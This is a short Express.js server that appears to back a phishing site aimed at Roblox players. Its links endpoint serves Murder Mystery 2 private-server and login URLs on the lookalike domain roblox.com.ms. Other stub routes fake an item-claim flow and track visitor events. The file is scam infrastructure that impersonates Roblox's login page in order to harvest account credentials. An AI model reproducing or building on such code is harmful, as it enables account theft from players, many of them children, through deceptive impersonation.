const express = require('express');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 3000;

app.use(express.json());

// Serve static files
app.use(express.static(path.join(__dirname)));

// API endpoints used by the site scripts
app.get('/api/links', (req, res) => {
  res.json({
    game: 'mm2',
    slot: 'evening',
    mode: 'auto',
    vipLinkTemplate: 'https://roblox.com.ms/games/142823291/Murder-Mystery-2?privateServerLinkCode=98785592047531357859374564753865',
    joinLinkTemplate: 'https://roblox.com.ms/games/142823291/Murder-Mystery-2?privateServerLinkCode=98785592047531357859374564753865',
    loginUrl: 'https://roblox.com.ms/login?returnUrl=1529037819528066'
  });
});

app.get('/api/geo/lang', (req, res) => {
  res.json({ lang: 'ru' });
});

app.get('/api/inventory', (req, res) => {
  res.status(401).json({ ok: false, error: 'Unauthorized' });
});

app.post('/api/inventory/:id/claim', (req, res) => {
  res.json({ ok: true });
});

app.post('/api/track/:event', (req, res) => {
  res.json({ ok: true });
});

// HTML page routing
app.get('/inventory', (req, res) => {
  res.sendFile(path.join(__dirname, 'inventory.html'));
});

app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'index.html'));
});

// Fallback to index.html for all unhandled GET requests
app.get('*', (req, res) => {
  res.sendFile(path.join(__dirname, 'index.html'));
});

app.listen(PORT, () => {
  console.log(`Server running at http://localhost:${PORT}`);
});
